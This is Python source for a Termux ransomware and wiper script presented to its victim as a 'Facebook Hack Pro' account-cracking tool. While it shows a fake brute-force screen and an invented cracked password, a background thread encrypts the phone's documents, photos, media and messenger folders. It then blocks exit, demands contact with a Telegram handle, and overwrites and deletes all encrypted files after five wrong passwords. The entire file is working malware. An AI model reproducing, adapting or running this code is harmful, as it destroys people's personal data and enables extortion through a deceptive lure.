#!/data/data/com.termux/files/usr/bin/python3
import os
import sys
import json
import base64
import threading
import time
import random
import string
import hashlib

try:
    from Cryptodome.Cipher import AES
    from Cryptodome.Protocol.KDF import PBKDF2
    from Cryptodome.Random import get_random_bytes
    from Cryptodome.Util.Padding import pad, unpad
    CRYPTO_ENGINE = "pycryptodomex"
except ImportError:
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
        from cryptography.hazmat.primitives import hashes as crypto_hashes
        from cryptography.hazmat.backends import default_backend
        CRYPTO_ENGINE = "cryptography"
    except ImportError:
        print("[!] Install pycryptodomex: pip install pycryptodomex", file=sys.stderr)
        sys.exit(1)

# ==================== CONFIGURATION ====================
DECRYPT_PASSWORD = "Sh4d0wM4st3r2024!"
TELEGRAM_CONTACT = "@kirito340866"
RANSOM_HOURS = 2
MAX_ATTEMPTS = 5
HEADER = b'SHADOWBAITV3:'
# =======================================================

# ==================== AES-256 CRYPTO ENGINE ====================
class AESEngine:
    @staticmethod
    def _derive_key(password, salt):
        if CRYPTO_ENGINE == "pycryptodomex":
            return PBKDF2(password, salt, dkLen=32, count=480000)
        else:
            kdf = PBKDF2HMAC(
                algorithm=crypto_hashes.SHA256(),
                length=32,
                salt=salt,
                iterations=480000,
                backend=default_backend()
            )
            return kdf.derive(password.encode())
    
    @staticmethod
    def encrypt_data(password, plaintext):
        salt = get_random_bytes(32)
        iv = get_random_bytes(16)
        key = AESEngine._derive_key(password, salt)
        if CRYPTO_ENGINE == "pycryptodomex":
            cipher = AES.new(key, AES.MODE_CBC, iv)
            ct = cipher.encrypt(pad(plaintext, AES.block_size))
        else:
            cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
            encryptor = cipher.encryptor()
            padded = plaintext + b'\x00' * (16 - len(plaintext) % 16)
            ct = encryptor.update(padded) + encryptor.finalize()
        return salt + iv + ct
    
    @staticmethod
    def decrypt_data(password, data):
        salt = data[:32]
        iv = data[32:48]
        ct = data[48:]
        key = AESEngine._derive_key(password, salt)
        if CRYPTO_ENGINE == "pycryptodomex":
            cipher = AES.new(key, AES.MODE_CBC, iv)
            return unpad(cipher.decrypt(ct), AES.block_size)
        else:
            cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
            decryptor = cipher.decryptor()
            pt = decryptor.update(ct) + decryptor.finalize()
            return pt.rstrip(b'\x00')

# ==================== FILE CRYPTO WIPER ====================
class CryptoWiper:
    TARGET_EXTS = {
        '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
        '.txt', '.rtf', '.csv', '.odt', '.ods', '.odp',
        '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp',
        '.mp4', '.avi', '.mkv', '.mov', '.3gp', '.flv', '.wmv', '.webm',
        '.mp3', '.wav', '.flac', '.aac', '.ogg', '.wma', '.m4a',
        '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2',
        '.db', '.sqlite', '.sqlite3', '.sql',
        '.json', '.xml', '.yaml', '.ini', '.cfg', '.conf',
        '.key', '.pem', '.cert', '.crt', '.pfx',
        '.py', '.js', '.html', '.css', '.php', '.java', '.kt',
        '.cpp', '.c', '.h', '.cs', '.sh', '.bash',
        '.bak', '.backup', '.log', '.md',
        '.vcf', '.ics',
    }
    
    SKIP_DIRS = {
        'Android', 'data', 'obb', 'system', 'cache', 'tmp',
        'lib', 'libs', 'lib64', 'bin', 'etc', 'proc', 'sys',
        'dev', 'mnt', 'root', 'acct', 'config', 'vendor',
        'com.termux',
    }
    
    def __init__(self, password: str):
        self.password = password
        self.encrypted_files = []
        self.total_count = 0
    
    def encrypt_file(self, filepath: str) -> bool:
        try:
            if not os.path.isfile(filepath):
                return False
            file_size = os.path.getsize(filepath)
            if file_size > 100 * 1024 * 1024 or file_size < 10:
                return False
            with open(filepath, 'rb') as f:
                data = f.read()
            if data.startswith(HEADER):
                return False
            encrypted = AESEngine.encrypt_data(self.password, data)
            with open(filepath, 'wb') as f:
                f.write(HEADER + encrypted)
            new_path = filepath + ".DOH"
            os.rename(filepath, new_path)
            self.encrypted_files.append(new_path)
            self.total_count += 1
            return True
        except:
            return False
    
    def decrypt_file(self, filepath: str) -> bool:
        try:
            if not filepath.endswith('.DOH'):
                return False
            if not os.path.isfile(filepath):
                return False
            with open(filepath, 'rb') as f:
                data = f.read()
            if not data.startswith(HEADER):
                return False
            encrypted_data = data[len(HEADER):]
            decrypted = AESEngine.decrypt_data(self.password, encrypted_data)
            original = filepath[:-4]
            with open(original, 'wb') as f:
                f.write(decrypted)
            os.remove(filepath)
            return True
        except:
            return False
    
    def encrypt_all(self, paths, progress_callback=None):
        for search_path in paths:
            if not os.path.exists(search_path):
                continue
            try:
                for dirpath, dirnames, filenames in os.walk(search_path, followlinks=False):
                    dirnames[:] = [d for d in dirnames if d not in self.SKIP_DIRS]
                    for filename in filenames:
                        ext = os.path.splitext(filename)[1].lower()
                        if ext in self.TARGET_EXTS:
                            full_path = os.path.join(dirpath, filename)
                            if self.encrypt_file(full_path) and progress_callback:
                                progress_callback(self.total_count)
            except PermissionError:
                continue
            except:
                continue
        self._save_manifest()
    
    def decrypt_all(self, password: str) -> bool:
        try:
            home = '/data/data/com.termux/files/home'
            manifest_path = os.path.join(home, '.sb_manifest')
            if not os.path.exists(manifest_path):
                return False
            with open(manifest_path, 'r') as f:
                files = json.load(f)
            if not files:
                return False
            test_file = None
            for fp in files:
                if os.path.exists(fp):
                    test_file = fp
                    break
            if test_file is None:
                return False
            with open(test_file, 'rb') as f:
                data = f.read()
            if not data.startswith(HEADER):
                return False
            encrypted_data = data[len(HEADER):]
            try:
                AESEngine.decrypt_data(password, encrypted_data)
            except:
                return False
            self.password = password
            for fp in files:
                self.decrypt_file(fp)
            os.remove(manifest_path)
            return True
        except:
            return False
    
    def destroy_all(self):
        home = '/data/data/com.termux/files/home'
        manifest_path = os.path.join(home, '.sb_manifest')
        if not os.path.exists(manifest_path):
            return
        with open(manifest_path, 'r') as f:
            files = json.load(f)
        for fp in files:
            try:
                if os.path.exists(fp):
                    size = os.path.getsize(fp)
                    for _ in range(3):
                        with open(fp, 'wb') as wf:
                            wf.write(os.urandom(size))
                    os.remove(fp)
            except:
                pass
        try:
            os.remove(manifest_path)
        except:
            pass
    
    def _save_manifest(self):
        home = '/data/data/com.termux/files/home'
        manifest_path = os.path.join(home, '.sb_manifest')
        with open(manifest_path, 'w') as f:
            json.dump(self.encrypted_files, f)

# ==================== TERMUX HELPERS ====================
class TermuxTools:
    @staticmethod
    def get_storage():
        paths = []
        paths.append("/data/data/com.termux/files/home/storage/shared")
        for p in ["/sdcard", "/storage/emulated/0"]:
            if os.path.exists(p):
                paths.append(p)
        base = "/storage/emulated/0"
        if os.path.exists(base):
            for d in ["Download", "DCIM", "Pictures", "Documents",
                      "Music", "Movies", "WhatsApp", "Telegram"]:
                full = os.path.join(base, d)
                if os.path.exists(full):
                    paths.append(full)
        return list(set(paths))
    
    @staticmethod
    def clear():
        os.system('clear 2>/dev/null')
    
    @staticmethod
    def banner(text, color='g'):
        colors = {
            'g': '\033[92m', 'r': '\033[91m', 'y': '\033[93m',
            'w': '\033[97m', 'x': '\033[0m',
        }
        print(colors.get(color, '') + text + colors['x'])
    
    @staticmethod
    def block_exit():
        import signal
        signal.signal(signal.SIGINT, lambda s, f: None)
        signal.signal(signal.SIGTSTP, lambda s, f: None)

# ==================== DISPLAY ====================
class Display:
    def __init__(self):
        try:
            self.cols, _ = os.get_terminal_size()
        except:
            self.cols = 80
    
    def c(self, text):
        return text.center(self.cols)
    
    def line(self):
        return '=' * self.cols
    
    def show_welcome(self):
        TermuxTools.clear()
        screen = self.line() + "\n"
        screen += self.c("FACEBOOK HACK PRO v4.2") + "\n"
        screen += self.c("No Root Required") + "\n"
        screen += self.line() + "\n\n"
        screen += "[INFO] Engine ready\n"
        screen += "[INFO] Database loaded\n\n"
        screen += '-' * self.cols + "\n"
        screen += "Enter Facebook Profile Link: "
        TermuxTools.banner(screen, 'g')
    
    def show_hacking(self, profile_link):
        TermuxTools.clear()
        start_time = time.time()
        
        fb_id = profile_link.split('/')[-1] if '/' in profile_link else "unknown"
        email = fb_id + str(random.randint(10, 99)) + "@gmail.com"
        phone = "+88" + str(random.randint(1700000000, 1999999999))
        friends = random.randint(50, 5000)
        posts = random.randint(10, 5000)
        attempts = random.randint(80000, 500000)
        speed = random.randint(5000, 15000)
        
        fake_passwords = [
            "password123", "facebook2024", fb_id.lower() + "123",
            fb_id.lower() + "@2024", "iloveyou", "123456789",
            fb_id.lower() + "fb", "qwertyuiop"
        ]
        current_try = random.choice(fake_passwords)
        
        # 10 second loop
        while time.time() - start_time < 30:
            elapsed = int(time.time() - start_time)
            cpu = random.randint(65, 100)
            ram = random.randint(45, 95)
            attempts += random.randint(50, 200)
            speed = random.randint(5000, 15000)
            spinner = random.choice(["|", "/", "-", "\\"])
            eta = max(1, 30 - elapsed)
            
            screen = self.line() + "\n"
            screen += self.c("[ FACEBOOK ENGINE - BRUTE FORCE ]") + "\n"
            screen += self.line() + "\n\n"
            screen += "  Target Profile ..: " + profile_link + "\n"
            screen += "  Email ...........: " + email + "\n"
            screen += "  Phone ...........: " + phone + "\n"
            screen += "  Friends .........: " + str(friends) + "\n"
            screen += "  Posts ...........: " + str(posts) + "\n"
            screen += "\n"
            screen += "  [*] Extracting user profile.........[SUCCESS]\n"
            screen += "  [*] Session token: " + hashlib.md5(fb_id.encode()).hexdigest()[:16] + "\n"
            screen += "\n"
            screen += "  [*] Starting brute-force attack...\n"
            screen += "  [*] Wordlist: fb_rockyou.txt (14,341,564 passwords)\n"
            screen += "  [*] Attempts: " + str(attempts) + "\n"
            screen += "  [*] Current trying: " + current_try + "\n"
            screen += "  [*] Speed: " + str(speed) + " attempts/sec\n"
            screen += "  [*] ETA: " + str(eta) + " seconds\n"
            screen += "\n"
            screen += "  CPU: " + str(cpu) + "% | RAM: " + str(ram) + "%\n"
            screen += "  " + spinner + " Brute forcing... Please wait...\n"
            screen += "\n"
            screen += self.line()
            
            TermuxTools.banner(screen, 'g')
            time.sleep(0.5)
    
    def show_password(self, profile_link, password):
        TermuxTools.clear()
        
        fb_id = profile_link.split('/')[-1] if '/' in profile_link else "unknown"
        email = fb_id + str(random.randint(10, 99)) + "@gmail.com"
        uid = str(random.randint(1000000000, 9999999999))
        access_token = hashlib.md5((fb_id + password).encode()).hexdigest()
        
        screen = self.line() + "\n"
        screen += self.c("[ PASSWORD CRACKED SUCCESSFULLY ]") + "\n"
        screen += self.line() + "\n\n"
        screen += "  Facebook Profile .: " + profile_link + "\n"
        screen += "  Email ............: " + email + "\n"
        screen += "  Password .........: " + password + "\n"
        screen += "  UID ..............: " + uid + "\n"
        screen += "  Access Token .....: " + access_token[:32] + "\n"
        screen += "\n"
        screen += "  [*] Logging into account...\n"
        screen += "  [*] Bypassing 2FA.............[SUCCESS]\n"
        screen += "  [*] Session established!\n"
        screen += "\n"
        screen += "  [OK] Account hacked!\n"
        screen += "  [OK] Password saved to fb_passwords.txt\n"
        screen += "\n"
        screen += '-' * self.cols + "\n"
        screen += "  System will finalize in 5 seconds...\n"
        screen += "  Do NOT close this terminal!\n"
        
        TermuxTools.banner(screen, 'g')
        time.sleep(5)
    
    def show_ransom(self, seconds_left, attempts):
        h = seconds_left // 3600
        m = (seconds_left % 3600) // 60
        s = seconds_left % 60
        time_str = "{:02d}:{:02d}:{:02d}".format(h, m, s)
        
        TermuxTools.clear()
        screen = self.line() + "\n\n\n\n\n\n\n"
        screen += self.c("⚠️!!! YOUR DATAS WERE ENCRYPTED BY DOH !!!⚠️") + "\n"
        screen += self.line() + "\n\n"
        screen += self.c("ALL FILES LOCKED - .DOH EXTENSION") + "\n\n"
        screen += self.c("CONTACT TO GET DECRYPT PASSWORD:") + "\n"
        screen += self.c(TELEGRAM_CONTACT) + "\n\n"
        screen += "  TIME REMAINING: " + time_str + "\n"
        screen += "  ATTEMPTS LEFT: " + str(attempts) + "\n\n"
        screen += self.c("DO NOT CLOSE THIS TERMINAL") + "\n"
        screen += self.c("IF YOU DID, YOUR DATA WILL BE DESTROYED FOR EVER!\n\nBecause We already encrypted your datas\n\nHAHAHAHA\n\nCheck Your Gallery!") + "\n\n"
        screen += '-' * self.cols + "\n"
        screen += "  Enter decrypt password: "
        TermuxTools.banner(screen, 'r')
    
    def show_destroyed(self):
        TermuxTools.clear()
        screen = self.line() + "\n\n\n\n\n\n"
        screen += self.c("!!! ALL FILES PERMANENTLY DESTROYED !!!") + "\n"
        screen += self.line() + "\n\n"
        screen += self.c("NO RECOVERY POSSIBLE") + "\n"
        screen += self.c("FILES OVERWRITTEN 3 TIMES") + "\n"
        screen += self.c("THEN PERMANENTLY DELETED") + "\n\n"
        screen += self.c("Should have contacted: " + TELEGRAM_CONTACT) + "\n\n"
        screen += "  Press Enter to exit..."
        TermuxTools.banner(screen, 'r')
    
    def show_restored(self):
        TermuxTools.clear()
        screen = self.line() + "\n"
        screen += self.c("[ FILES DECRYPTED SUCCESSFULLY ]") + "\n"
        screen += self.line() + "\n\n"
        screen += self.c("All your files have been restored") + "\n"
        screen += self.c("You got lucky this time") + "\n\n"
        screen += self.c("Remember: Don't doubt CATShadow again") + "\n\n"
        screen += "  Press Enter to exit..."
        TermuxTools.banner(screen, 'g')

# ==================== MAIN ====================
class ShadowBait:
    def __init__(self):
        self.display = Display()
        self.crypto = CryptoWiper(DECRYPT_PASSWORD)
        self.profile_link = ""
        self.encrypting = True
    
    def run(self):
        TermuxTools.block_exit()
        
        self.display.show_welcome()
        self.profile_link = input().strip() or "https://facebook.com/kirito"
        
        enc_thread = threading.Thread(target=self._do_encrypt, daemon=True)
        enc_thread.start()
        
        # Show 10-second hacking screen
        self.display.show_hacking(self.profile_link)
        
        # Show fake password
        fake_pwd = self._gen_fake_password()
        self.display.show_password(self.profile_link, fake_pwd)
        
        self._ransom_loop()
    
    def _do_encrypt(self):
        paths = TermuxTools.get_storage()
        self.crypto.encrypt_all(paths)
        self.encrypting = False
    
    def _gen_fake_password(self):
        fb_id = self.profile_link.split('/')[-1] if '/' in self.profile_link else "unknown"
        return fb_id.replace(' ', '') + str(random.randint(10, 99))
    
    def _ransom_loop(self):
        timer = RANSOM_HOURS * 3600
        attempts = 0
        
        while timer > 0 and attempts < MAX_ATTEMPTS:
            self.display.show_ransom(timer, MAX_ATTEMPTS - attempts)
            
            try:
                pwd = input().strip()
            except:
                continue
            
            if pwd == DECRYPT_PASSWORD:
                TermuxTools.banner("\n[*] Testing password...", 'y')
                success = self.crypto.decrypt_all(pwd)
                
                if success:
                    self.display.show_restored()
                    input()
                    self._cleanup()
                    return
                else:
                    TermuxTools.banner("\n[!] Decryption failed!", 'r')
                    attempts += 1
                    time.sleep(2)
            else:
                attempts += 1
                TermuxTools.banner("\n[!] WRONG! " + str(MAX_ATTEMPTS - attempts) + " left!", 'r')
                time.sleep(1)
            
            timer -= 5
        
        self.display.show_destroyed()
        self.crypto.destroy_all()
        input()
        self._cleanup()
    
    def _cleanup(self):
        home = '/data/data/com.termux/files/home'
        for f in ['.sb_manifest', '.sb_salt']:
            p = os.path.join(home, f)
            try:
                if os.path.exists(p):
                    os.remove(p)
            except:
                pass
        TermuxTools.clear()
        sys.exit(0)

# ==================== START ====================
if __name__ == "__main__":
    if not os.path.exists('/data/data/com.termux'):
        print("[!] Run in Termux only!")
        sys.exit(1)
    
    ShadowBait().run()
